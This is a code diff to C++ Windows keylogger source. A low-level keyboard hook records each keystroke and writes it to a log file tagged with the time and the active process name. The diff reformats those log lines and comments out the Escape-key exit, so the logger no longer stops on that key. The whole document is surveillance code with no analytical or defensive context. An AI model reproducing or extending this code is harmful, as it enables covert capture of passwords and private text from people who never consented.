@@ -98,10 +98,12 @@ void flush()
     if (myfile.is_open())
     {
         std::time_t logTime = system_clock::to_time_t(system_clock::now());
-        myfile << std::ctime(&logTime) << "\n";
+        std::string time = std::ctime(&logTime);
+
+        myfile << time.substr(11, 8) << ": ";
 
         std::string procName = getProcName(getCurrentPID());
-        myfile << procName << ": ";
+        myfile << procName << " > ";
 
         for (int i = 0; i < keyBuffer.size(); i++)
         {
@@ -138,16 +140,18 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     {
         KBDLLHOOKSTRUCT *pKeyStruct = (KBDLLHOOKSTRUCT *)lParam;
 
-        keyBuffer.push_back(keyboardMap[pKeyStruct->vkCode]);
-        if ((pKeyStruct->vkCode == '\n' || pKeyStruct->vkCode == '\t' || pKeyStruct->vkCode == '\r') && keyBuffer.size() > 0)
+        if (pKeyStruct->vkCode == '\n' || pKeyStruct->vkCode == '\t' || pKeyStruct->vkCode == '\r')
         {
-            keyBuffer.pop_back();
             flush();
         }
-        else if (pKeyStruct->vkCode == 0x1B)
+        else
         {
-            exit(0);
+            keyBuffer.push_back(keyboardMap[pKeyStruct->vkCode]);
         }
+        // else if (pKeyStruct->vkCode == 0x1B)
+        // {
+        //     exit(0);
+        // }
     }
 
     return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
